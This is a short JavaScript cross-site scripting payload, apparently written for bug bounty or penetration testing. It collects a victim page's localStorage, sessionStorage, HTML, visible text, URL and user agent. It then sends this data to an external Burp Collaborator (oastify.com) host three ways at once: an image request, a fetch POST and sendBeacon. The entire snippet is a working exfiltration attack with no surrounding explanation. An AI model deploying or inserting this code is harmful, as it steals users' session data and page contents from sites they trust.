(function(){
  var burp="http://w630bbm6tppekzwbv9aovobqlhr8f03p.oastify.com/";
  
  var fullHTML=document.documentElement.outerHTML;
  var bodyText=document.body.innerText;
  
  var payload={
    ci_session_nota:'HttpOnly - No accessible via JS',
    but_html_contains:'Check raw HTML for Set-Cookie headers',
    localStorage:JSON.stringify(localStorage),
    sessionStorage:JSON.stringify(sessionStorage),
    pageHTML:fullHTML.substring(0,20000),
    pageText:bodyText.substring(0,5000),
    userAgent:navigator.userAgent,
    url:window.location.href,
    timestamp:new Date().toISOString()
  };
  
  var encoded=btoa(JSON.stringify(payload));
  new Image().src=burp+'?data='+encoded;
  fetch(burp,{method:'POST',mode:'no-cors',body:JSON.stringify(payload)}).catch(function(){});
  navigator.sendBeacon(burp,JSON.stringify(payload));
})();
